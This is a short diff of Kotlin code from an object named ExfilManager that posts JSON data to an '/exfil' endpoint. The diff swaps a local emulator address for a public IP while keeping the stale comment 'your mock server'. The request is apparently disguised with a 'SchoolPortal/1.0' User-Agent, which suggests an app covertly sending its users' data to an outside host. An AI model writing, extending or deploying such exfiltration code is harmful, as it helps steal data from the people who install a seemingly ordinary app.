@@ -25,7 +25,7 @@ object ExfilManager {
                 val body = json.toRequestBody(jsonType)
 
                 val request = Request.Builder()
-                    .url("http://10.0.2.2:5000/exfil")  // ← your mock server
+                    .url("http://139.59.244.51:5002/exfil")  // ← your mock server
                     .post(body)
                     .addHeader("User-Agent", "SchoolPortal/1.0")
                     .build()
